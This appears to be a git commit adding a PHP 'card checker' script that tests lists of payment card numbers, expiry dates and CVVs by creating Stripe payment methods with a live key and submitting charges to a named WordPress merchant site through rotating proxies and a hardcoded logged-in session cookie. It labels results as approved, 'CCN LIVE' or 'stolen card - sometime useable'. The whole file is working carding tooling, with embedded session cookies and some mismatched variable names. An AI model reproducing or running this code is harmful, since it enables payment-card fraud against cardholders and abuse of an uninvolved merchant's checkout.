0d2ccaf547338bc4ea62cdcb4ada5774f526adbf
shoaiblala786 <71655853+shoaiblala786@users.noreply.github.com>
2020-09-21 21:16:46 +0530

    Add files via upload

---
+++ api.php
@@ -0,0 +1,199 @@
+<?php
+
+//FREE WORKING API BY [MAARI]
+
+error_reporting(0);
+set_time_limit(0);
+error_reporting(0);
+date_default_timezone_set('America/Buenos_Aires');
+
+
+function multiexplode($delimiters, $string)
+{
+  $one = str_replace($delimiters, $delimiters[0], $string);
+  $two = explode($delimiters[0], $one);
+  return $two;
+}
+$lista = $_GET['lista'];
+$cc = multiexplode(array(":", "|", ""), $lista)[0];
+$mes = multiexplode(array(":", "|", ""), $lista)[1];
+$ano = multiexplode(array(":", "|", ""), $lista)[2];
+$cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+function GetStr($string, $start, $end)
+{
+  $str = explode($start, $string);
+  $str = explode($end, $str[1]);
+  return $str[0];
+}
+function xcodeproxy()
+{
+  $poxySocks = file("proxy.txt");
+  $myproxy = rand(0, sizeof($poxySocks) - 1);
+  $poxySocks = $poxySocks[$myproxy];
+  return $poxySocks;
+}
+$poxySocks4 = xcodeproxy();
+
+////////////////////////////===[Randomizing Details Api]
+
+$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
+preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+$name = $matches1[1][0];
+preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+$last = $matches1[1][0];
+preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+$email = $matches1[1][0];
+preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+$street = $matches1[1][0];
+preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+$city = $matches1[1][0];
+preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+$state = $matches1[1][0];
+preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+$phone = $matches1[1][0];
+preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+$postcode = $matches1[1][0];
+
+////////////////////////////===[Luminati Details]
+
+ $username = 'Put Zone Username Here';
+$password = 'Put Zone Password Here';
+$port = 22225;
+$session = mt_rand();
+$super_proxy = 'zproxy.lum-superproxy.io';
+
+////////////////////////////===[For Authorizing Cards]
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(  
+'authority: api.stripe.com',
+'accept: application/json',
+'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/v3/controller-2360f24418c95d95248b5dc78e7a3298.html',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site'));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+//========================================================================================================================//
+//========================================================================================================================//
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=Box+22+Ave&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][state]=NY&billing_details[address][postal_code]=10026&billing_details[name]=Nalla+Boy&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&guid=090ce4bd-0d7d-48d9-9778-6240ec28d8f5b51423&muid=c736b3c7-80ba-4f2b-8e00-a4ba42bbf7b6c9070b&sid=972f0e45-18b6-47c1-9a35-f8e2daaf9b6c48ec3f&payment_user_agent=stripe.js%2Fa704c85b%3B+stripe-js-v3%2Fa704c85b&time_on_page=31060&referrer=https%3A%2F%2Fwww.theglobalbeautyawards.com%2Fregister%2Fvip-pro-membership-voting-member%2F%3Faction%3Dcheckout%26txn%3D12a&key=pk_live_51ApPtxFPpj3pFH5FOHwDQ369PF3siMxSCrIrbjMmeVTuqK5An412vgO60dvkLHbrLb93Fqg0Hli8s7otnn4gHOSM00npmrzCgX');
+//========================================================================================================================//
+//========================================================================================================================//
+$result = curl_exec($ch);
+$token = trim(strip_tags(getStr($result,'"id": "','"')));
+////////////////////////////===============[For Charging Cards]=============////////////////////////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.theglobalbeautyawards.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: www.theglobalbeautyawards.com',
+'accept: application/json, text/javascript, */*; q=0.01',
+'cookie: wordpress_sec_f0272bf3ac0453652cab5e90c2869d5e=nallaboy822%40gmail.com%7C1600661424%7CbMCmzGw2fHgIPPtiuAMHZZW0QKDwYi4Kb83Zo1E8sVU%7Cecd06ff0c23b591f667300770218ee9cbe275685697fc338d3f8bc4bd6f093c2;__cfduid=d17afd60114d6fb884a851bca4f269fad1600483620;_ga=GA1.2.1336425559.1600483632;_gid=GA1.2.7687811.1600483632;PHPSESSID=726b8ac772efe472c5d653ebb8d8e73c;wordpress_logged_in_f0272bf3ac0453652cab5e90c2869d5e=nallaboy822%40gmail.com%7C1600661424%7CbMCmzGw2fHgIPPtiuAMHZZW0QKDwYi4Kb83Zo1E8sVU%7Cc8a78150122e8a24c97ec525c0ee8e8ff8c491cd4faadd6c7c23db7c36b5d3e1;wordpress_cf_adm_use_adm=1;__stripe_mid=c736b3c7-80ba-4f2b-8e00-a4ba42bbf7b6c9070b;__stripe_sid=972f0e45-18b6-47c1-9a35-f8e2daaf9b6c48ec3f',
+'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'origin: https://www.theglobalbeautyawards.com',
+'referer: https://www.theglobalbeautyawards.com/register/vip-pro-membership-voting-member/?action=checkout&txn=12a',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin'));
+//========================================================================================================================//
+//========================================================================================================================//
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'mepr_transaction_id=1378&address_required=1&card-address-one=Box+22+Ave&card-address-two=&card-address-city=New+York&card-address-country=US&card-address-state=NY&card-address-zip=10028&card-name=Nalla+Boy&payment_method_id='.$token.'&action=mepr_stripe_confirm_payment&mepr_current_url=https%3A%2F%2Fwww.theglobalbeautyawards.com%2Fregister%2Fvip-pro-membership-voting-member%2F%3Faction%3Dcheckout%26txn%3D12a%23mepr_jump');
+//========================================================================================================================//
+//========================================================================================================================//
+$result = curl_exec($ch);
+
+////////////////////////////===[Card Response]
+
+if (strpos($result, '"cvc_check": "pass"')) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [MAARI] ♛ </span></br>';
+}
+elseif(strpos($result, "Thank You For Donation." )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [MAARI] ♛ </span></br>';
+}
+elseif(strpos($result, "Thank You." )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED [MAARI] </span></br>';
+}
+elseif(strpos($result, 'security code is incorrect.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE  [MAARI]♛ </span></br>';
+}
+elseif(strpos($result, 'security code is invalid.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI]/span></br>';
+}
+elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI] </span></br>';
+}
+elseif (strpos($result, "incorrect_cvc")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [MAARI]♛ </span></br>';
+}
+elseif(strpos($result, 'incorrect_zip' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip [MAARI]♛ </span></br>';
+}
+elseif (strpos($result, "stolen_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable [MAARI] ♛ </span></br>';
+}
+elseif (strpos($result, "lost_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable [MAARI]♛ </span></br>';
+}
+elseif(strpos($result, 'Your card has insufficient funds.')) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds [MAARI]♛ </span></br>';
+}
+elseif(strpos($result, 'Your card has expired.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired [MAARI]♛</span> </br>';
+}
+elseif (strpos($result, "pickup_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable [MAARI] ♛ </span></br>';
+}
+elseif(strpos($result, 'Your card number is incorrect.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [MAARI] ♛</span> </br>';
+}
+ elseif (strpos($result, "incorrect_number")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [MAARI]♛</span> </br>';
+}
+elseif(strpos($result, 'Your card was declined.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined [MAARI] ♛</span> </br>';
+}
+elseif (strpos($result, "generic_decline")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline [MAARI]♛</span> </br>';
+}
+elseif (strpos($result, "do_not_honor")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor [MAARI] ♛</span> </br>';
+}
+elseif (strpos($result, '"cvc_check": "unchecked"')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] [MAARI] ♛</span> </br>';
+}
+elseif (strpos($result, '"cvc_check": "fail"')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail [MAARI]♛</span> </br>';
+}
+elseif (strpos($result, "expired_card")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card [MAARI] ♛</span> </br>';
+}
+elseif (strpos($result,'Your card does not support this type of purchase.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase [MAARI] ♛</span> </br>';
+}
+ else {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed [MAARI] ♛</span> </br>';
+}
+
+curl_close($ch);
+ob_flush();
+//////=========Comment Echo $result If U Want To Hide Site Side Response
+//echo $result 
+
+///////////////////////////////////////////////===========xD========\\\\\\\\\\\\\\\
+?>
